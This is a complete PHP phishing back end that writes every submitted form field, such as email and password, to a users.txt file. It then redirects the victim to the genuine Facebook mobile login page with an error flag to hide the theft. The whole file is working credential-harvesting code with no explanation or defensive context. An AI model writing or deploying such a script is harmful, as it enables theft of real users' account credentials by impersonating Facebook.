<?php
$handle = fopen("users.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
header("Location: https://m.facebook.com/login.php?&e=1348092&email=");

exit;
?> 
